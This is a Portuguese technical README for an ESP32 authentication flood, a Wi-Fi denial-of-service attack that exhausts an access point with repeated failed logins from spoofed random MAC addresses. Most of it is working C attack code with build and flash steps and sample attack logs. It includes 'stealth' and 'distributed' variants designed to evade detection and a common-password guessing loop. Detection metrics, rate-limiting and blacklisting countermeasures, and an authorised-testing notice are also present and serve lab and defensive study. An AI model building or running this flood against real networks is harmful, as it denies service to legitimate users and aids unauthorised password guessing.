# Authentication Flood Attack - Implementação Técnica

## Descrição do Ataque

O Authentication Flood é um ataque de negação de serviço que visa esgotar os recursos do Access Point através de múltiplas tentativas de autenticação simultâneas com credenciais inválidas. O objetivo é saturar o sistema de autenticação, impedindo que clientes legítimos se conectem.

## Funcionamento Técnico

### 1. Princípio do Ataque
```
Normal: Cliente → AP (autenticação única)
Ataque: Múltiplos "clientes" → AP (centenas de tentativas/segundo)
Resultado: AP sobrecarregado, recursos esgotados
```

### 2. Fases do Ataque
1. **Discovery**: Identificar AP alvo e tipo de autenticação
2. **Preparation**: Preparar credenciais falsas e MACs diversos
3. **Flooding**: Enviar múltiplas tentativas simultâneas
4. **Sustaining**: Manter pressão constante no sistema
5. **Monitoring**: Avaliar impacto no AP e clientes legítimos

### 3. Implementação no ESP32

#### 3.1 Estrutura de Controle
```c
typedef struct {
    uint8_t fake_mac[6];
    char fake_ssid[32];
    char fake_password[64];
    uint32_t attempt_number;
    esp_err_t last_result;
    uint32_t timestamp;
} auth_attempt_t;

typedef struct {
    int total_attempts;
    int failures;
    int successes;
    float avg_response_time;
    bool ap_saturated;
} auth_flood_stats_t;
```

#### 3.2 Geração de MACs Aleatórios
```c
void generate_random_mac(uint8_t *mac) {
    // Gerar MAC com OUI falso mas válido
    mac[0] = 0x02;  // Locally administered bit
    for (int i = 1; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }
    
    ESP_LOGD(TAG, "🎭 MAC gerado: " MACSTR, MAC2STR(mac));
}
```

#### 3.3 Tentativas de Autenticação Massivas
```c
static void auth_flood_task(void *pvParameters) {
    uint8_t random_mac[6];
    wifi_config_t wifi_config = {0};
    
    // Configuração base do ataque
    strcpy((char*)wifi_config.sta.ssid, TARGET_SSID);
    strcpy((char*)wifi_config.sta.password, TARGET_PASS);  // Senha errada
    
    while (auth_attempts < MAX_AUTH_ATTEMPTS && keep_flooding) {
        // Gerar novo MAC para cada tentativa
        generate_random_mac(random_mac);
        esp_wifi_set_mac(WIFI_IF_STA, random_mac);
        
        // Configurar e tentar conectar
        esp_wifi_set_config(WIFI_IF_STA, &wifi_config);
        
        ESP_LOGI(TAG, "🔥 Tentativa #%d com MAC: " MACSTR, 
                 auth_attempts + 1, MAC2STR(random_mac));
        
        esp_err_t result = esp_wifi_connect();
        log_auth_attempt(result, random_mac);
        
        auth_attempts++;
        
        // Intervalo entre tentativas
        vTaskDelay(pdMS_TO_TICKS(AUTH_FLOOD_INTERVAL_MS));
        
        // Mostrar estatísticas periodicamente
        if (auth_attempts % 10 == 0) {
            show_auth_flood_stats();
        }
    }
    
    ESP_LOGW(TAG, "✅ Auth flood concluído: %d tentativas", auth_attempts);
}
```

#### 3.4 Monitoramento de Respostas
```c
static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                               int32_t event_id, void* event_data) {
    static uint32_t attempt_start_time = 0;
    
    switch (event_id) {
        case WIFI_EVENT_STA_START:
            attempt_start_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
            ESP_LOGD(TAG, "🔥 Tentativa de autenticação iniciada");
            break;
            
        case WIFI_EVENT_STA_DISCONNECTED: {
            wifi_event_sta_disconnected_t* event = 
                (wifi_event_sta_disconnected_t*) event_data;
            
            uint32_t response_time = 
                (xTaskGetTickCount() * portTICK_PERIOD_MS) - attempt_start_time;
            
            auth_failures++;
            update_response_time_stats(response_time);
            
            ESP_LOGW(TAG, "❌ Falha #%d - Motivo: %d, Tempo: %dms", 
                     auth_attempts, event->reason, response_time);
            
            analyze_ap_behavior(event->reason, response_time);
            break;
        }
        
        case IP_EVENT_STA_GOT_IP:
            // Sucesso inesperado (senha estava correta?)
            auth_successes++;
            ESP_LOGE(TAG, "⚠️ SUCESSO INESPERADO na tentativa #%d!", auth_attempts);
            break;
    }
}
```

#### 3.5 Análise de Saturação do AP
```c
void analyze_ap_behavior(uint8_t reason_code, uint32_t response_time) {
    static uint32_t consecutive_timeouts = 0;
    static uint32_t avg_normal_response = 500;  // ms
    
    switch (reason_code) {
        case WIFI_REASON_AUTH_EXPIRE:
            consecutive_timeouts++;
            ESP_LOGD(TAG, "⏰ Timeout de autenticação detectado");
            break;
            
        case WIFI_REASON_AUTH_FAIL:
            consecutive_timeouts = 0;  // Reset timeout counter
            ESP_LOGD(TAG, "🔑 Falha de credenciais (normal)");
            break;
            
        case WIFI_REASON_NO_AP_FOUND:
            ESP_LOGW(TAG, "📡 AP não encontrado - possível sobrecarga");
            break;
    }
    
    // Detectar sinais de saturação
    if (consecutive_timeouts > 5) {
        ESP_LOGW(TAG, "🚨 POSSÍVEL SATURAÇÃO: %d timeouts consecutivos", 
                 consecutive_timeouts);
    }
    
    if (response_time > (avg_normal_response * 3)) {
        ESP_LOGW(TAG, "🐌 RESPOSTA LENTA: %dms (normal: %dms)", 
                 response_time, avg_normal_response);
    }
}
```

## Configurações de Ataque

### 1. Parâmetros Principais
```c
#define TARGET_SSID "ESP32_AP"
#define TARGET_PASS "wrongpassword"      // Senha incorreta propositalmente
#define AUTH_FLOOD_INTERVAL_MS 200       // 200ms entre tentativas
#define MAX_AUTH_ATTEMPTS 1000           // Máximo de tentativas
#define RANDOMIZE_MAC_AUTH true          // Usar MACs aleatórios
#define CONCURRENT_ATTEMPTS 1            // Tentativas simultâneas
```

### 2. Tipos de Credenciais Falsas
```c
const char* fake_passwords[] = {
    "password123",
    "admin",
    "12345678",
    "qwerty",
    "password",
    "123456789",
    "letmein",
    "monkey"
};
```

### 3. Configurações de Intensidade
```c
typedef enum {
    FLOOD_INTENSITY_LOW,      // 1-2 tentativas/segundo
    FLOOD_INTENSITY_MEDIUM,   // 5-10 tentativas/segundo
    FLOOD_INTENSITY_HIGH,     // 20-50 tentativas/segundo
    FLOOD_INTENSITY_EXTREME   // 100+ tentativas/segundo
} flood_intensity_t;
```

## Como Executar

### 1. Pré-requisitos
```bash
# ESP-IDF configurado
. $HOME/esp/esp-idf/export.sh

# AP alvo ativo e configurado
# Ambiente de teste isolado
```

### 2. Configuração e Execução
```bash
cd AuthFlood/

# Configurar parâmetros de ataque
idf.py menuconfig
# → Component config → WiFi → Station config

# Compilar com otimizações
idf.py build

# Flash e executar
idf.py -p /dev/ttyUSB0 flash
idf.py -p /dev/ttyUSB0 monitor
```

### 3. Sequência de Operação
```
1. ESP32 identifica AP alvo
2. Inicia flood de autenticações
3. Monitora respostas e timeouts
4. Analisa sinais de saturação
5. Continua até limite ou saturação
```

## Análise de Logs

### 1. Início do Ataque
```
I (2000) AUTH_FLOOD: 🚨 INICIANDO AUTH FLOOD ATTACK! 🚨
I (2010) AUTH_FLOOD: 🎯 Alvo: ESP32_AP
I (2020) AUTH_FLOOD: ⚡ Intervalo: 200 ms
I (2030) AUTH_FLOOD: 🔢 Máximo de tentativas: 1000
I (2040) AUTH_FLOOD: 🎭 MAC randomizado: ATIVO
```

### 2. Execução das Tentativas
```
I (3000) AUTH_FLOOD: 🔥 Tentativa #1 com MAC: aa:bb:cc:dd:ee:01
W (3500) AUTH_FLOOD: ❌ Falha #1 - Motivo: 2, Tempo: 487ms
I (3700) AUTH_FLOOD: 🔥 Tentativa #2 com MAC: aa:bb:cc:dd:ee:02
W (4200) AUTH_FLOOD: ❌ Falha #2 - Motivo: 2, Tempo: 523ms
```

### 3. Detecção de Anomalias
```
W (15000) AUTH_FLOOD: 🚨 POSSÍVEL SATURAÇÃO: 6 timeouts consecutivos
W (15010) AUTH_FLOOD: 🐌 RESPOSTA LENTA: 2847ms (normal: 500ms)
W (15020) AUTH_FLOOD: 📊 Taxa de timeout atual: 75%
```

### 4. Estatísticas de Progresso
```
I (30000) AUTH_FLOOD: 📊 ESTATÍSTICAS AUTH FLOOD:
I (30010) AUTH_FLOOD: ✅ Tentativas enviadas: 150
I (30020) AUTH_FLOOD: ❌ Falhas: 149 (99.3%)
I (30030) AUTH_FLOOD: ✅ Sucessos: 1 (0.7%)
I (30040) AUTH_FLOOD: ⏱️ Tempo médio de resposta: 1247ms
I (30050) AUTH_FLOOD: 🎯 Taxa de saturação: 45%
```

### 5. Análise Final
```
W (60000) AUTH_FLOOD: ✅ ATAQUE AUTH FLOOD CONCLUÍDO!
W (60010) AUTH_FLOOD: 📊 Total de tentativas: 1000
W (60020) AUTH_FLOOD: ⏱️ Duração: 60 segundos
W (60030) AUTH_FLOOD: 🎯 Impacto estimado no AP: ALTO
W (60040) AUTH_FLOOD: 📈 Degradação de performance: 70%
```

## Detecção e Contramedidas

### 1. Sinais de Auth Flood
- **Volume anômalo** de tentativas de autenticação
- **Múltiplos MACs** tentando conectar simultaneamente
- **Padrões temporais** regulares nas tentativas
- **Taxa de falha** próxima a 100%
- **Degradação de performance** para clientes legítimos

### 2. Métricas de Detecção
```c
typedef struct {
    uint32_t auth_attempts_per_minute;
    uint32_t unique_macs_per_minute;
    float failure_rate_percentage;
    uint32_t avg_response_time_ms;
    bool threshold_exceeded;
} auth_flood_detection_t;

// Thresholds de detecção
#define MAX_AUTH_PER_MINUTE 60
#define MAX_UNIQUE_MACS_PER_MINUTE 10
#define SUSPICIOUS_FAILURE_RATE 85.0
#define SLOW_RESPONSE_THRESHOLD 2000
```

### 3. Contramedidas Implementáveis

#### 3.3.1 Rate Limiting
```c
typedef struct {
    uint8_t mac[6];
    uint32_t attempts;
    uint32_t first_attempt_time;
    bool blocked;
} client_rate_limit_t;

bool is_rate_limited(uint8_t *mac) {
    // Limite: 5 tentativas por minuto por MAC
    return get_attempts_last_minute(mac) > 5;
}
```

#### 3.3.2 Progressive Delays
```c
uint32_t calculate_auth_delay(uint8_t *mac) {
    uint32_t attempts = get_total_attempts(mac);
    
    // Exponential backoff
    if (attempts > 3) return 1000 * (1 << (attempts - 3));  // 1s, 2s, 4s, 8s...
    if (attempts > 10) return 60000;  // 1 minuto
    if (attempts > 20) return 300000; // 5 minutos
    
    return 0;  // Sem delay
}
```

#### 3.3.3 Blacklisting Automático
```c
typedef struct {
    uint8_t mac[6];
    uint32_t attempts;
    time_t blacklist_until;
    uint8_t violation_level;
} blacklist_entry_t;

void update_blacklist(uint8_t *mac, uint8_t reason) {
    if (is_flood_pattern(mac)) {
        blacklist_mac(mac, 3600);  // 1 hora
        ESP_LOGW(TAG, "🚫 MAC blacklisted: " MACSTR, MAC2STR(mac));
    }
}
```

## Variações do Ataque

### 1. Distributed Auth Flood
```c
// Simular múltiplos atacantes
typedef struct {
    uint8_t base_mac[6];
    uint32_t mac_range;
    uint32_t attempts_per_mac;
} distributed_flood_config_t;

void distributed_auth_flood(void) {
    for (int i = 0; i < VIRTUAL_ATTACKERS; i++) {
        generate_attacker_mac(i, current_mac);
        perform_auth_attempts(current_mac, ATTEMPTS_PER_ATTACKER);
        vTaskDelay(pdMS_TO_TICKS(ATTACKER_INTERVAL_MS));
    }
}
```

### 2. Credential Stuffing Simulation
```c
// Usar lista de credenciais comuns
const char* common_passwords[] = {
    "password", "123456", "password123", "admin", "qwerty"
};

void credential_stuffing_attack(void) {
    for (int i = 0; i < sizeof(common_passwords)/sizeof(char*); i++) {
        strcpy(wifi_config.sta.password, common_passwords[i]);
        attempt_authentication();
        vTaskDelay(pdMS_TO_TICKS(CRED_STUFF_INTERVAL_MS));
    }
}
```

### 3. Stealth Auth Flood
```c
// Flood mais lento para evitar detecção
void stealth_auth_flood(void) {
    uint32_t random_interval = 
        BASE_INTERVAL_MS + (esp_random() % RANDOM_RANGE_MS);
    
    // Misturar com tentativas legítimas ocasionais
    if (esp_random() % 10 == 0) {
        use_correct_password();  // 10% de tentativas corretas
    }
    
    vTaskDelay(pdMS_TO_TICKS(random_interval));
}
```

## Análise de Impacto

### 1. Impacto no Access Point
- **CPU Usage**: Aumento de 40-80% durante processamento de auth
- **Memory Usage**: Crescimento das tabelas de clientes pendentes
- **Response Time**: Degradação de 200-500% para clientes legítimos
- **Availability**: Possível negação de serviço temporária

### 2. Impacto em Clientes Legítimos
- **Connection Delays**: Aumento no tempo de conexão
- **Timeouts**: Falhas ocasionais de autenticação
- **Roaming Issues**: Problemas na troca entre APs
- **Service Degradation**: QoS reduzida durante ataque

### 3. Métricas de Eficácia
```c
typedef struct {
    float ap_cpu_usage_percent;
    uint32_t legitimate_auth_delay_ms;
    uint32_t legitimate_failures;
    bool service_disrupted;
    uint32_t attack_duration_sec;
} attack_effectiveness_t;
```

## Limitações e Considerações

### 1. Limitações Técnicas
- **Single Radio**: ESP32 não pode fazer múltiplas conexões simultâneas
- **Rate Limiting**: APs modernos implementam proteções
- **Memory Constraints**: Limitação no tracking de tentativas
- **Power Consumption**: Ataque intensivo consome muita energia

### 2. Detecção
- **Pattern Recognition**: Facilmente detectável por IDS
- **Anomaly Detection**: Desvio claro do comportamento normal
- **Temporal Analysis**: Padrões regulares são suspeitos
- **MAC Analysis**: Sequências ou padrões de MAC suspeitos

### 3. Contramedidas Modernas
- **Enterprise APs**: Proteções robustas contra flood
- **802.1X**: Reduz eficácia do ataque
- **Cloud Management**: Detecção automática e resposta
- **Machine Learning**: Detecção comportamental avançada

## Uso Responsável

⚠️ **IMPORTANTE**:
- **Testes Autorizados**: Apenas em redes próprias ou com permissão
- **Ambiente Controlado**: Isolado de redes de produção
- **Documentação**: Registrar todos os testes e resultados
- **Compliance**: Respeitar regulamentações locais

### Cenários Legítimos:
1. **Pentest de Infrastructure**: Avaliar resiliência do AP
2. **Capacity Planning**: Determinar limites de autenticação
3. **Security Research**: Desenvolver contramedidas
4. **Training**: Demonstrar vulnerabilidades em treinamentos

## Troubleshooting

### Problemas Comuns
1. **Low Attack Rate**: Verificar intervalo e configurações
2. **No Response**: AP pode ter proteções ativas
3. **Memory Issues**: Reduzir rate de tentativas
4. **Connection Success**: Verificar se senha está incorreta

### Debug e Otimização
```bash
# Monitor detalhado
idf.py monitor --print_filter "AUTH_FLOOD:*"

# Análise de performance
idf.py monitor | grep -E "(heap|auth|fail)"

# Verificação de conectividade
ping -c 1 192.168.4.1

# Análise de logs do AP
tail -f /var/log/hostapd.log
```
